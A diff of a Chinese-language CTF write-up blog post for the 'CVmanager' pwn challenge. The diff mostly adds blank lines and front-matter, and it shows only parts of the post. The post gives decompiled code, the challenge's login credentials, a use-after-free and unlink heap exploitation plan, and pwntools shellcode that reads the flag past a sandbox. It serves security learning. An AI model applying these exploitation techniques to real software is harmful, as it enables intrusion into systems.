@@ -1,18 +1,21 @@
 ---
-layout: post
+layout: single
 title: "CVmanager"
 date: 2026-10-07 20:05:00 +0800
 tags: ["CTF", "Write-up"]
 description: "记录 2025 年 das 比赛中 CVmanager 题目的分析与解题过程。"
 source_folder: "Write-ups/2025/das/CVmanager"
 lang: zh-CN
+excerpt: "记录 2025 年 das 比赛中 CVmanager 题目的分析与解题过程。"
 ---
 {% raw %}
+
 # checksec
 ![09f7c1af-c08d-43c8-9ad6-2b5b5a49eeff](/assets/ctf/f88840e7689d92e118a3.webp)
 
 # 反编译
 `main:`
+
 ```c
 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
 {
@@ -59,8 +62,11 @@ LABEL_13:
   }
 }
 ```
+
 main逆向完后如上，中有一个`login()`需要绕过。
+
 ## `login()`:
+
 ```c
 unsigned __int64 login()
 {
@@ -83,8 +89,10 @@ unsigned __int64 login()
   return v3 - __readfsqword(0x28u);
 }
 ```
+
 会校验`username`和`password`，`password`会过`base64()`函数。
 `base64()`:
+
 ```c
 _BOOL8 __fastcall base64(const char *a1)
 {
@@ -147,8 +155,10 @@ _BOOL8 __fastcall base64(const char *a1)
   return strcmp(s1, "s3BPcTsMszo=") == 0;
 }
 ```
+
 该函数负责对接受内容进行base64加密后与密文校验，其加密表在`a0123456789abcd`中（`.bss`段）。
 登录如下：
+
 ```python
 sla(b"username:", b"r00t")
 sla(b"password:", b"p9s3w0r6")
@@ -156,6 +166,7 @@ sla(b"password:", b"p9s3w0r6")
 
 ## `.bss`段数组
 通过伪代码中的强制类型转换，与赋值推断结构体；`for`循环检索，推断数组大小，结果如下：
+
 ```c
 unsigned __int64 add()
 {
@@ -225,10 +236,12 @@ unsigned __int64 backdoor()
   return v2 - __readfsqword(0x28u);
 }
 ```
+
 程序给了uaf，而且打印了elf地址，解决了pie的问题。
 
 # 攻击思路
 程序只给了一次uaf，同时泄露pie，原程序有堆数组，可以直接打`unlink`，直接任意地址写，与任意地址读。
+
 ```python
 for i in range(9):
     add(0x138, b"CCTTFFEERR!!")
@@ -287,6 +300,7 @@ def r(addr, size):
 给了`exit()`同时有沙箱：
 ![1ee27625-3204-44f0-9e88-2ee1e2ede5ad](/assets/ctf/7bf2aa36bdee3983be33.webp)
 这里用`openv+mmap+writev`:
+
 ```python
 shellcode = shellcraft.amd64.openat(-100, "flag", 0)
 shellcode += shellcraft.amd64.mmap(0, 0x100, 1, 1, "rax", 0)
@@ -300,9 +314,11 @@ shellcode += shellcraft.amd64.writev(1, "rsp", 1)
 shellcode = asm(shellcode)
 
 ```
+
 对于栈迁移与执行流控制，通过`apple2  +  getkeyserv_handle+576  +  `setcontext+61。
 
 # exp如下：
+
 ```python
 from pwncli import *
 import sys
